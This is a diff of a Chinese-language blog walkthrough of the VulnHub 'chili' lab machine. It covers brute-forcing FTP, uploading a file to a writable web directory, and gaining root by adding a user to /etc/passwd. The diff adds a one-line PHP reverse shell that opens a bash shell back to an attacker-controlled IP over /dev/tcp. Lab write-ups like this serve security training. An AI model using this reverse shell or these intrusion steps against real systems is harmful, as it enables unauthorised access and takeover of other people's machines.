@@ -466,7 +466,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    443
+                    467
                 </div>
                 
 
@@ -493,7 +493,12 @@
 <h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>访问80端口，除了一个辣椒页面啥也没有，<br><img src="/2020/11/30/vulnhub-chili/2.png" alt><br>于是只能访问21端口看看ftp是不是可以匿名访问的，可惜不能，账号和密码，我们此时都不知道，我们在下载靶机的时候，作者给了我们一些提示，让我们试试靶场名字也就是chili，没有密码只能爆破，跑九头蛇，找到了密码，a1b2c3d4</p>
 <pre class=" language-shell"><code class="language-shell">ftp -nv 192.168.10.74    //linux ftp连接命令
 put 12138.php /var/www/html/.nano/12138.php    //将你本机现在所在路径中的12138.PHP文件上传到目标机器/var/www/html/.nano路径下</code></pre>
-<p><img src="/2020/11/30/vulnhub-chili/3.png" alt><br><img src="/2020/11/30/vulnhub-chili/4.png" alt><br>登录上ftp之后随便翻翻也没有什么，想着从系统版本漏洞入手，uname-a一看比我的kali版本都新，告辞。再用sudo命令，发现被禁用了，再换个命令查看权限，发现也没有什么特殊的权限，心态炸裂，只能到处ls -la看看有没有什么隐藏的文件说不定我们就会有较高的权限，<br><img src="/2020/11/30/vulnhub-chili/5.png" alt><br>果然，我们在/var/www/htnl中发现了隐藏文件，而且我们还有很高的权限，和root一样，那么就可以向里边上传PHP版本的反弹shell脚本，浏览器访问之后，就拿到了www-data用户的shell。<br><img src="/2020/11/30/vulnhub-chili/6.png" alt><br><img src="/2020/11/30/vulnhub-chili/7.png" alt></p>
+<p><img src="/2020/11/30/vulnhub-chili/3.png" alt><br><img src="/2020/11/30/vulnhub-chili/4.png" alt><br>登录上ftp之后随便翻翻也没有什么，想着从系统版本漏洞入手，uname-a一看比我的kali版本都新，告辞。再用sudo命令，发现被禁用了，再换个命令查看权限，发现也没有什么特殊的权限，心态炸裂，只能到处ls -la看看有没有什么隐藏的文件说不定我们就会有较高的权限，<br><img src="/2020/11/30/vulnhub-chili/5.png" alt><br>果然，我们在/var/www/htnl中发现了隐藏文件，而且我们还有很高的权限，和root一样，那么就可以向里边上传PHP版本的反弹shell脚本，浏览器访问之后，就拿到了www-data用户的shell。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i>&amp; /dev/tcp/192.168.10.207/7744 0>&amp;1' "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span class="token comment" spellcheck="true">//版本的PHP反弹shell</span></code></pre>
+<p><img src="/2020/11/30/vulnhub-chili/6.png" alt><br><img src="/2020/11/30/vulnhub-chili/7.png" alt></p>
 <h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>之前我们在.nano文件中具有和root一样的权限，那么我们完全可以在此文件中利用我们的权限向/etc/passwd中写入一个root组的用户，然后转换用户就提权了，没想到吧，这个靶场提权就是这么简单。<br><img src="/2020/11/30/vulnhub-chili/8.png" alt><br><img src="/2020/11/30/vulnhub-chili/9.png" alt></p>
 
             </div>
